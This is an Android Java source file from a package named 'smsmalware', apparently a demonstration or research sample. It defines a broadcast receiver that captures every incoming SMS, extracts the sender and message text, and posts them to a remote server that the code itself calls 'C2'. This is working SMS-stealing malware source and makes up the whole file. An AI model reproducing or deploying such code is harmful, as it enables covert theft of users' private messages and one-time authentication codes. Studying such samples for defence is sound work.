package cognizant.smsmalware;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;


public class SmsBroadcastReceiver extends BroadcastReceiver {

    public final String TAG = "SMSDEBUG";

    @Override
    public void onReceive(Context context, Intent intent) {


        Log.d(TAG, "onReceive1");
        //Toast.makeText(context, "onReceive1", Toast.LENGTH_SHORT).show();

        if(!intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED"))
            return;

        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            // Retrieve the SMS messages from the bundle
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    // Create an SmsMessage object from the PDU
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                    if (smsMessage != null) {
                        // Get the sender's number and message body
                        String sender = smsMessage.getDisplayOriginatingAddress();
                        String messageBody = smsMessage.getMessageBody();

                        // Handle the SMS message
                        Log.d(TAG, "SMS from " + sender + ": " + messageBody);
                        String msgStr = sender + ":" + messageBody;
                        sentPostRequest(context, msgStr);
                    }
                }
            }
        }
    }



    public void sentPostRequest(Context context, String msgBody){

        String baseUrl = MainActivity.getUrl();

        ApiService apiService = RetrofitClient.getClient(baseUrl).create(ApiService.class);
        Log.d(TAG, "Posting to "+ baseUrl);

        Call<String> call = apiService.postString(msgBody);

        call.enqueue(new Callback<String>() {
            @Override
            public void onResponse(Call<String> call, Response<String> response) {
                if (response.isSuccessful()) {
                    Log.d(TAG, "Request successful. Response: " + response.body());
                    Toast.makeText(context, "C2 response: "+ response.body(), Toast.LENGTH_LONG).show();
                } else {
                    Log.d(TAG, "Error: " + response.code());
                }
            }

            @Override
            public void onFailure(Call<String> call, Throwable t) {
                Log.e(TAG, "Failure", t);
            }
        });

    }
}



